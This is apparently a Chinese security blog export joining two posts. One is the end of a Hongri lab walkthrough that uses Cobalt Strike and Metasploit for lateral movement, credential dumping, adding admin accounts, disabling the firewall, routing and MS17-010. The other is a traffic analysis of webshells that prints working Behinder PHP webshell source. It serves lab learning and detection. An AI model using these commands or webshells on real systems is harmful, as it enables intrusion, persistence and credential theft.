/domain<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737555.png" alt="image-20240508233119937"></p><p><strong>横向移动</strong></p><p>直接输入<code>net view</code>命令可以探测到其他的域主机</p><p><img src="http://cdn.clown2024.cn/202407151737556.png" alt="image-20240508233307337"></p><p><img src="http://cdn.clown2024.cn/202407151737557.png" alt="image-20240508233320930"></p><p>点击上图的地方列出我们刚刚扫描出来的内网主机，右击选择jump&#x3D;》psexec去登陆一下尝试，密码就是我们改过的这个<code>Hongrisec@2019</code>，因为密码一般都是由域控管理的，所以一般都是一样的，所以win7这台靶机其实也应该改成这个密码才对。</p><p>然后这里就可以直接一把梭了其实，直接用当前主机的凭据去用psexec横向移动即可，因为凭据都是一样的，然后监听器也选择那个反向shell的http监听器</p><p><img src="http://cdn.clown2024.cn/202407151737558.png" alt="image-20240508234256791"></p><p>两台主机都这样选择，然后等待回连即可</p><p>emmm很尴尬只上线了一台域控，另一台域成员反而没上线很奇怪</p><p><img src="http://cdn.clown2024.cn/202407151737559.png" alt="image-20240508235438343"></p><p>后来先建立了smb监听就可以进行psexec横向移动了，增加一个smb监听器即可</p><p><img src="http://cdn.clown2024.cn/202407151737560.png" alt="image-20240517224609304"></p><p><img src="http://cdn.clown2024.cn/202407151737561.png" alt="image-20240517224625150"></p><p>接下来用MSF的打法，学学其他东西</p><p><strong>关闭防火墙、添加管理员账户</strong></p><p>这里一开始上线应该顺手创立管理员用户然后关闭防火墙的，补一下:</p><p>还要开3389用于远程连接</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off <span class="hljs-comment">#win关闭防火墙</span><br>net user clown 123qwe@2024 /add   <span class="hljs-comment">#添加账户密码</span><br>net localgroup administrators clown <span class="hljs-comment">#添加为管理员权限</span><br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f <span class="hljs-comment">#开启3389端口</span><br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f <span class="hljs-comment">#关闭3389</span><br></code></pre></td></tr></table></figure><h1><span id="msf渗透打法">MSF渗透打法</span></h1><h2><span id="cs联动msf">CS联动MSF</span></h2><p>这里就不重新用MSF来拿shell了</p><p>我们可以CS开启一个新监听，然后msf开启监听，将session转移到msf上面</p><p><img src="http://cdn.clown2024.cn/202407151737562.png" alt="image-20240517232416545"></p><p><img src="http://cdn.clown2024.cn/202407151737563.png" alt="image-20240517232757549"></p><p>MSF:</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_http <span class="hljs-comment">#一定要注意payload是http不是tcp，一开始用了tcp一直连不上</span><br><span class="hljs-built_in">set</span> lhost 192.168.20.128<br><span class="hljs-built_in">set</span> lport 6666<br>exploit<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737564.png" alt="image-20240518001337395"></p><p><strong>也可以MSF派生会话给cs</strong></p><p>这里记录流程就不试了</p><p>首先msf中已有会话session1</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use exploit/windows/local/payload_inject<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_http  <span class="hljs-comment">#两边的payload协议一定要对应的</span><br><span class="hljs-built_in">set</span> DisablePayloadHandler <span class="hljs-literal">true</span>   <span class="hljs-comment">#默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于已经有了一个不需要再产生一个，所以这里设置为true</span><br><span class="hljs-built_in">set</span> lhost xxxx <span class="hljs-comment">#cobaltstrike服务端ip</span><br><span class="hljs-built_in">set</span> lport xxxx <span class="hljs-comment">#cobaltstrike服务端监听的端口 </span><br><span class="hljs-built_in">set</span> session 1  <span class="hljs-comment">#这里是当前获得的session的id</span><br>exploit<br></code></pre></td></tr></table></figure><p>然后cs就可以成功拿到shell</p><p><strong>进程迁移</strong></p><p>因为meterpreter会话不太稳定，上线后可以做一个进程迁移，参考文章：<a href="https://blog.csdn.net/weixin_44023693/article/details/104925099">https://blog.csdn.net/weixin_44023693/article/details/104925099</a></p><ol><li><p>先ps获取目标主机的进程</p><p><img src="http://cdn.clown2024.cn/202407151737565.png" alt="image-20240518001528797"></p></li><li><p>getpid查看自己的进程号</p><p><img src="http://cdn.clown2024.cn/202407151737566.png" alt="image-20240518001555284"></p></li><li><p>利用migrate迁移到稳定的进程，可以选择svchost.exe或者explorer.exe，这里用explorer.exe</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">migrate 1452<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737567.png" alt="image-20240518002212153"></p><p>也可以用自动迁移进程的命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">run post/windows/manage/migrate<br></code></pre></td></tr></table></figure></li></ol><blockquote><p>迁移也会窃取到对应用户的令牌</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151737568.png" alt="image-20240518004001288"></p><h2><span id="msf横向移动">MSF横向移动</span></h2><p>这里可以先抓取一下本地用户的明文密码或者哈希，待会psexec横向移动的时候会用到</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">hashdump<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737569.png" alt="image-20240518004658364"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>clown:1005:aad3b435b51404eeaad3b435b51404ee:d42bd392b52fdac4b29d5cdf59cff276:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br></code></pre></td></tr></table></figure><p>然后使用kiwi模块，mimikatz已经集成在里面了</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use kiwi<br><span class="hljs-built_in">help</span> <span class="hljs-comment">#查看命令</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737570.png" alt="image-20240518004846544"></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">getsystem  <span class="hljs-comment">#提权</span><br>creds_all  <span class="hljs-comment">#获取所有凭据</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737571.png" alt="image-20240518005050479"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Administrator  GOD     Hongrisec@2019<br></code></pre></td></tr></table></figure><p><strong>进入终端</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">shell  <span class="hljs-comment">#进入终端</span><br></code></pre></td></tr></table></figure><p><strong>查看域内主机</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">chcp 65001  <span class="hljs-comment">#改变编码，不然会乱码</span><br>net view<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737572.png" alt="image-20240518005427752"></p><p><strong>查看是否为蜜罐</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">run post/windows/gather/checkvm <span class="hljs-comment">#查看是否为虚拟机(蜜罐)</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737573.png" alt="image-20240518011240458"></p><p><strong>添加路由转发</strong></p><p>路由转发的具体作用参考这篇文章：<a href="https://www.anquanke.com/post/id/86505">https://www.anquanke.com/post/id/86505</a></p><p>大概作用就是利用该主机作为跳板机，在MSF平台上添加去往内网网段的路由</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">run autoroute -h  <span class="hljs-comment">#查看路由添加帮助</span><br>run get_local_subnets  <span class="hljs-comment">#查看主机所处的所有网段</span><br>run autoroute -s 192.168.52.0/24 <span class="hljs-comment">#添加去往目标网段的路由</span><br><br>run post/multi/manage/autoroute <span class="hljs-comment">#自动添加路由</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737574.png" alt="image-20240518011451547"></p><p><img src="http://cdn.clown2024.cn/202407151737575.png" alt="image-20240518011507107"></p><p><img src="http://cdn.clown2024.cn/202407151737576.png" alt="image-20240518011553537"></p><p><strong>继续渗透</strong></p><p>路由打通后就需要将会话放到后台然后进行其他攻击操作</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">background<br>sessions -i<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737577.png" alt="image-20240518011730502"></p><p>接下来就可以进行端口扫描</p><p>先进行局部端口扫描</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">background                                      <br>use auxiliary/scanner/portscan/tcp <br><span class="hljs-built_in">set</span> rhosts 192.168.52.141 192.168.52.138  <span class="hljs-comment">#可以对一整网段也行，具体的主机ip可以从上面的ping主机名获取</span><br><span class="hljs-built_in">set</span> ports 80,135-139,445,3306,3389<br>run<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737578.png" alt="image-20240518012512080"></p><p>可以先尝试一下永恒之蓝</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use auxiliary/scanner/smb/smb_ms17_010<br><span class="hljs-built_in">set</span> rhosts 192.168.52.0/24<br><span class="hljs-built_in">set</span> threads 50<br>run<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737579.png" alt="image-20240518012240761"></p><p>然后尝试用永恒之蓝攻击拿shell</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">search ms17-010<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737580.png" alt="image-20240518014204665"></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use 0<br><span class="hljs-built_in">set</span> RHOSTS 192.168.52.138 <span class="hljs-comment">#192.168.52.141是32位的，这个模块只能打64位的机器</span><br>run<br></code></pre></td></tr></table></figure><p>额服了138也打不通很怪，一直报这个错误</p><p><img src="http://cdn.clown2024.cn/202407151737581.png" alt="image-20240518023451960"></p><p>但是用另一个只能执行一条命令模块能成功，所以还有另一种思路，就是先将三台主机的3389开启之后，先连上第一台Windows7的远程，再连另外两台</p><p>另一模块的使用如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use 2<br><span class="hljs-built_in">set</span> rhosts 192.168.52.138 <span class="hljs-comment">#目的地址</span><br><span class="hljs-built_in">set</span> <span class="hljs-built_in">command</span> REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f <span class="hljs-comment">#设置开启3389的命令</span><br>run<br></code></pre></td></tr></table></figure><p><strong>psexec打法</strong></p><p>emmm这个看别人视频打不通，用了frp也不行，视频链接：<a href="https://search.bilibili.com/all?vt=67228223&keyword=%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80&from_source=webtop_search&spm_id_from=333.1007&search_source=3">红日靶场一-哔哩哔哩_bilibili</a></p><p>这里就懒了不试了（</p><p><strong>socks代理设置</strong></p><p>上面的路由只能msf访问，想要其他应用访问还要设置socks代理，参考这篇文章：<a href="https://blog.csdn.net/qq_44159028/article/details/124631522">https://blog.csdn.net/qq_44159028/article/details/124631522</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> Proxies socks5:127.0.0.1:8989<br><span class="hljs-built_in">set</span> ReverseAllowProxy <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见webshell流量分析</title>
      <link href="/2024/04/29/%E5%B8%B8%E8%A7%81webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>/2024/04/29/%E5%B8%B8%E8%A7%81webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>webshell常见的流量特征：</p><ol><li>网络通信模式：Webshell工具通常会与控制服务器进行通信，通过特定的网络协议传输数据。这些通信模式与正常的网络通信模式存在差异，如使用非标准端口、频繁的连接和断开等。</li><li>数据传输方式：Webshell工具可能使用加密或编码的方式传输数据，以隐藏其真实目的和内容。对于电子数据取证来说，需要解密或解码这些数据，以还原其原始内容。</li><li>文件操作行为：Webshell工具通常会对服务器上的文件进行读取、写入、删除等操作。这些文件操作行为可能涉及到敏感文件、系统文件或与被攻击的Web服务器相关的文件。通过分析这些文件操作行为，可以发现潜在的Webshell存在。</li><li>系统调用和命令执行：Webshell工具可能会利用系统调用和命令执行来执行一些恶意操作，如执行命令、修改系统配置等。通过监测和分析系统调用和命令执行的行为，可以发现Webshell的存在。</li></ol><p>这里学习参考文章：<a href="https://www.forensics-wiki.com/linux/webshell/">https://www.forensics-wiki.com/linux/webshell/</a></p><h1><span id="菜刀">菜刀</span></h1><p>中国菜刀 (Chopper) 是一款经典的网站连接工具支持的服务端脚本有 PHP、ASP、ASPX，具有文件管理数据库管理、虚拟终端等功能。</p><p>其流量特征较为明显，而且现在也比较少用，就拿一道buu上的题目来进行分析。</p><p>菜刀的流量特征：</p><ol><li><p>payload在请求体中，采用url编码+base64编码，payload部分是明文传输。</p></li><li><p>payload中有eval或assert、base64_decode这样的字符。</p></li><li><p>payload中有默认固定的&amp;z0&#x3D;QGluaV9zZXQ…这样base64加密的攻击载荷，参数z0对应$_POST[z0]接收到的数据，且固定为QGluaV9zZXQ开头。进行base64解码后可看到代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);这段意思是首先关闭报错和magic_quotes，接下来去获取主机的信息。<br></code></pre></td></tr></table></figure></li></ol><p><img src="http://cdn.clown2024.cn/202407151450073.png" alt="image-20240501191342304"></p><p>然后追踪一下tcp流去看一下请求和响应报文</p><p><img src="http://cdn.clown2024.cn/202407151450074.png" alt="image-20240501191930991"></p><p>可以看到明显的base64特征和eval函数等，action参数传递的就是payload，也符合上面的特征，&amp;action&#x3D;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGl</p><p>我们可以去解码看一下这些payload</p><p><img src="http://cdn.clown2024.cn/202407151450075.png" alt="image-20240501192402117"></p><p>再根据下面的响应信息应该是执行了类似ls之类的操作</p><p>再去看看其他流有没有什么东西，在流7发现下面的东西</p><p><img src="http://cdn.clown2024.cn/202407151450076.png" alt="image-20240501200327032"></p><p>将z1解码看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">RDpcd2FtcDY0XHd3d1x1cGxvYWRcNjY2Ni5qcGc%3D<br><br>//解码<br>D:\wamp64\www\upload\6666.jpg<br></code></pre></td></tr></table></figure><p>应该是就是目录中的那张图片，前面的文件头也符合jpg的文件头</p><p>我们可以去将这个十六进制数据导出分组字节流</p><p><img src="http://cdn.clown2024.cn/202407151450077.png" alt="image-20240501202011704"></p><p>打开010导入Hex</p><p><img src="http://cdn.clown2024.cn/202407151450078.png" alt="image-20240501202722257"></p><p>然后再另存为1.jpg即可</p><p><img src="http://cdn.clown2024.cn/202407151450079.png" alt="image-20240501202801906"></p><p>在流9发现了下面的东西</p><p><img src="http://cdn.clown2024.cn/202407151450080.png" alt="image-20240501200405110"></p><p>将z1参数解码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">RDpcd2FtcDY0XHd3d1x1cGxvYWRcaGVsbG8uemlw<br><br>//解码<br>D:\wamp64\www\upload\hello.zip<br></code></pre></td></tr></table></figure><p>访问了一个需要密码的压缩包，可以用foremost直接提取出来</p><p><img src="http://cdn.clown2024.cn/202407151450081.png" alt="image-20240501201550429"></p><p>密码就是上面的图片，解压即可得到flag</p><h1><span id="蚁剑">蚁剑</span></h1><p>蚁剑的很多源码来自菜刀，所以链接流量特征与中国菜刀很相似，但是蚁剑的扩充性很好可以对进行加密，混淆等绕过处理。蚁剑默认支持 ASP以及PHP的Webshell链接，还可以通过插件来扩展其功能。</p><p>其流量特征如下：</p><ol><li><p>请求时可选择多种编码器，如果采用默认的方式，则仅进行url编码。</p></li><li><p>进行连接时会进行两次请求，第一次请求的payload和菜刀相似，也是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);<br></code></pre></td></tr></table></figure><p>意思是关闭报错和magic_quotes，接下来区获取主机信息。这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码。</p></li><li><p>第二次请求会把主机的目录列出来</p></li><li><p>由于蚁剑中包含了很多加密、绕过插件，所以导致很多流量被加密后无法识别，但是蚁剑混淆加密后还有一个比较明显的特征，即为参数名大多以“_0x…..&#x3D;”这种形式。</p><p>所以，以_0x开头的参数名，后面为加密数据的数据包也可识别为蚁剑的流量特征。</p></li></ol><p>这里本地去抓了看看，这里用的default的编码，即url编码</p><p><img src="http://cdn.clown2024.cn/202407151450082.png" alt="image-20240501230752754"></p><p>这是base64时的请求</p><p><img src="http://cdn.clown2024.cn/202407151450083.png" alt="image-20240501231413437"></p><p>再去看一下http请求的参数</p><p><img src="http://cdn.clown2024.cn/202407151450084.png" alt="image-20240501230857449"></p><p>emmm但是没有以0x开头，但是参数名字就会比较奇怪</p><h1><span id="冰蝎">冰蝎</span></h1><p>冰蝎是一款动态二进制加密 Web 远程管理客户端，以进行动态流量加密，且加密密钥是由使用者来设定，但是该拦截器对 webshell 的需求比较高，无法连接一句话木马。</p><p>所以该工具的目录下面都会配备已经写好的各种格式的shell，比如php、jsp等。</p><blockquote><p>这里一开始我的jdk17打不开冰蝎，去查了一下，可能是Java版本太高的原因，因为很多webshell工具的图形化都需要JavaFX库，但是从JAVA11之后这个库就被移除了，所以换一个低版本的java就好了。</p></blockquote><h2><span id="冰蝎10">冰蝎1.0</span></h2><p>可以看一下他的shell.php的内容，但是他原来的内容写的很简化也没有换行就很难看，我让ai给我格式化了一下加了个注释</p><p>原来的：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;;<span class="hljs-title function_ invoke__">session_start</span>();<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>])?<span class="hljs-keyword">print</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-title function_ invoke__">rand</span>())),<span class="hljs-number">16</span>):(<span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>), <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>])))&amp;@<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(),<span class="hljs-variable">$b</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>后来的：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span> . <span class="hljs-string">&quot;&quot;</span>);<br>    &#125;<br>&#125;;<br><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-comment">// 检查是否存在 URL 参数 &#x27;pass&#x27;</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>])) &#123;<br>    <span class="hljs-comment">// 如果存在 &#x27;pass&#x27; 参数，则设置一个会话变量 &#x27;k&#x27;</span><br>    <span class="hljs-comment">// &#x27;k&#x27; 是通过 md5 散列和 uniqid 随机生成的字符串的子串</span><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>] = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-title function_ invoke__">rand</span>())), <span class="hljs-number">16</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 如果 &#x27;pass&#x27; 参数不存在，则执行以下操作</span><br>    <span class="hljs-comment">// 首先，使用会话变量 &#x27;k&#x27; 和 AES128 加密解密从 php://input 读取的内容</span><br>    <span class="hljs-comment">// &#x27;php://input&#x27; 用于获取通过 POST 请求发送的输入数据</span><br>    <span class="hljs-comment">// openssl_decrypt 用于解密数据，如果会话变量 &#x27;k&#x27; 不存在则可能产生错误</span><br>    <span class="hljs-comment">// 接着，使用 explode 函数以 &#x27;|&#x27; 字符分割解密后的数据</span><br>    <span class="hljs-comment">// 最后，尝试调用 C 类的 __invoke 方法，传入分割后数组的第二个元素</span><br>    <span class="hljs-comment">// 这可能导致任意代码执行，因为 __invoke 调用 eval</span><br>    <span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>), <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$b</span> !== <span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(), <span class="hljs-string">&#x27;__invoke&#x27;</span>))) &#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(), <span class="hljs-variable">$b</span>[<span class="hljs-number">1</span>]);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>AES加密，对比冰蝎2.0少了base64的过程。</p><h2><span id="冰蝎20">冰蝎2.0</span></h2><ol><li>使用 AES加密+base64编码发起三次请求。</li><li>第一次GET请求服务端产生密钥写入 session，session 和当前会话绑定，不同的客户端的密钥也是不同的。第二次GET请求是为了获取密钥 key，服务端会生成16位的AES密钥。第三次使用 key 的AES加密进行通信，通信也采用了base64编码。</li><li>进行请求时内置了十几个User-Agent头，每次请求时会随机选择其中的一个。因此当发现一个ip的请求头中的user-agent在频繁变换，就可能是冰蝎。</li></ol><p>shell.php，这里加上了注释</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 关闭错误报告，避免输出错误信息</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// 开启会话</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-comment">// 检查 URL 参数 &#x27;pass&#x27; 是否存在</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>])) &#123;<br>    <span class="hljs-comment">// 如果存在 &#x27;pass&#x27; 参数</span><br>    <span class="hljs-comment">// 生成一个随机的 MD5 散列值，并取其后 16 个字符作为密钥</span><br>    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-title function_ invoke__">rand</span>())), <span class="hljs-number">16</span>);<br>    <span class="hljs-comment">// 将生成的密钥存储在会话变量 &#x27;k&#x27; 中</span><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>] = <span class="hljs-variable">$key</span>;<br>    <span class="hljs-comment">// 输出密钥</span><br>    <span class="hljs-keyword">print</span> <span class="hljs-variable">$key</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 如果 &#x27;pass&#x27; 参数不存在</span><br>    <span class="hljs-comment">// 从会话变量 &#x27;k&#x27; 中获取密钥</span><br>    <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>];<br>    <span class="hljs-comment">// 从 php://input 获取 POST 请求的数据</span><br>    <span class="hljs-variable">$post</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br>    <br>    <span class="hljs-comment">// 检查 openssl 扩展是否已加载</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>)) &#123;<br>        <span class="hljs-comment">// 如果 openssl 扩展未加载，使用基于 base64 和简单的异或操作的自定义加密/解密方法</span><br>        <span class="hljs-variable">$post</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$post</span>);<br>        <br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>); <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-comment">// 对每个字符进行异或操作</span><br>            <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] ^ <span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span> + <span class="hljs-number">1</span> &amp; <span class="hljs-number">15</span>];<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 如果 openssl 扩展已加载，使用 AES128 加密算法进行解密</span><br>        <span class="hljs-variable">$post</span> = <span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">// 使用 &#x27;|&#x27; 字符将解密后的字符串分割为数组</span><br>    <span class="hljs-variable">$arr</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$post</span>);<br>    <span class="hljs-comment">// 获取数组的第一个元素作为要执行的函数名</span><br>    <span class="hljs-variable">$func</span> = <span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-comment">// 获取数组的第二个元素作为函数参数</span><br>    <span class="hljs-variable">$params</span> = <span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br>    <br>    <span class="hljs-comment">// 定义一个类 C，其构造函数使用 eval 执行传入的参数</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span> . <span class="hljs-string">&quot;&quot;</span>);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 实例化类 C，并传入参数 $params，这将执行 eval</span><br>    <span class="hljs-comment">// 这是非常危险的，因为它允许执行任意 PHP 代码</span><br>    @<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(<span class="hljs-variable">$params</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>我们去抓取流量包看一下特征</p><p>第一次访问绑定session</p><p><img src="http://cdn.clown2024.cn/202407151450085.png" alt="image-20240502005646958"></p><p>第二次访问获取key</p><p><img src="http://cdn.clown2024.cn/202407151450086.png" alt="image-20240502010016480"></p><p>第三次开始利用session中的key进行加密通信</p><p><img src="http://cdn.clown2024.cn/202407151450087.png" 